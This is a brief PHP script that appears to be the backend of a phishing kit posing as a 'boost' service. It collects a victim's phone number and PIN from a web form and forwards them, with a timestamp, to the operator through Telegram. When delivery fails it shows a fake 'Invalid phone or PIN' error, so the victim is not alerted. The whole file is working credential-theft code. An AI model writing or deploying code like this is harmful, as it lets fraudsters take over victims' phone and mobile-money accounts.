<?php
require_once './Telegram.php';
header('Content-Type: application/json');

$phone = $_POST['phone'] ?? '';
$pin = $_POST['pin'] ?? '';

$message = "
*New Boost Request*
phone: `{$phone}`
pin: `{$pin}`
Time: *" . date('Y-m-d H:i:s') . "*
";
$telegram = new Telegram();
$sended = $telegram->send($message);
if ($sended) {
  echo json_encode(['success' => true]);
} else {
  echo json_encode(['success' => false, 'error' => 'Invalid phone or PIN']);
}